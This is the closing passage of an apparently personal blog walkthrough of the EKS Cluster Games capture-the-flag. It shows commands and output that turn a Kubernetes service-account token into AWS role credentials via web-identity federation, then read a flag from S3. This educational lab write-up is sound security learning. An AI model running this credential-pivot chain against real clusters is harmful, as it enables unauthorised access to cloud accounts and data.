#96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eTOKEN=$(\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e create token debug-sa \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--audience\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e sts.amazonaws.com)\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ests\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eassume-role-with-web-identity\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--role-arn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003earn:aws:iam::688655246681:role/challengeEksS3Role\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--role-session-name\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003etest\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--web-identity-token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e $TOKEN\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Credentials\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"AccessKeyId\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ASIA2AVYNEV\u0026#x3C;*REDACTED*\u003e\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"SecretAccessKey\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"VTZ4TuDrtHGca\u0026#x3C;*REDACTED*\u003e\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"SessionToken\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf\u0026#x3C;*REDACTED*\u003e\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Expiration\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-03T05:09:07+00:00\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"SubjectFromWebIdentityToken\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"system:serviceaccount:challenge5:debug-sa\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"AssumedRoleUser\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"AssumedRoleId\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"AROA2AVYNEVMZEZ2AFVYI:test\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Arn\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Provider\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Audience\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"sts.amazonaws.com\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSuccess!  We have some new AWS credentials.  Lets setup our new AWS Session:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAWS_ACCESS_KEY_ID=\"ASIA2AVYNEV\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAWS_SECRET_ACCESS_KEY=\"VTZ4TuDrtHGca\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAWS_SESSION_TOKEN=\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ests\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget-caller-identity\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"UserId\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"AROA2AVYNEVMZEZ2AFVYI:test\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Account\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"688655246681\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Arn\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe are now the new role!   We hopefully have access to S3 now.  At the start\nof the challenge it provided us a clue to what bucket we want to view by\nproviding us the IAM policy:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"json\" data-theme=\"default\"\u003e\u003ccode data-language=\"json\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #8DDB8C\"\u003e\"Policy\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #8DDB8C\"\u003e\"Statement\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #8DDB8C\"\u003e\"Action\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"s3:GetObject\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"s3:ListBucket\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #8DDB8C\"\u003e\"Effect\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"Allow\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #8DDB8C\"\u003e\"Resource\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #8DDB8C\"\u003e\"Version\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2012-10-17\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we want to fetch \u003ccode\u003earn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003es3\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecp\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003es3://challenge-flag-bucket-3ff1ae2/flag\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e.\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003edownload:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003es3://challenge-flag-bucket-3ff1ae2/flag\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eto\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e./flag\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e       \u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecat\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eflag\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewiz_eks_challenge\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{w0w_y0u_really_are_4n_eks_and_aws\u0026#x3C;*REDACTED*\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand thats the final flag! In my next post I'll discuss the remediation steps\nto prevent this configuration mistakes on your cluster!\u003c/p\u003e","category":"Kubernetes","date":"2023-11-02T00:00:00Z","tags":["Kubernetes","SRE","Security"],"title":"eksclustergames.com walk through!"}},"__N_SSG":true},"page":"/blog/[...id]","query":{"id":["2023","eks_cluster_games_ctf"]},"buildId":"AoGbC8xlMEkyyIwWs3twS","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>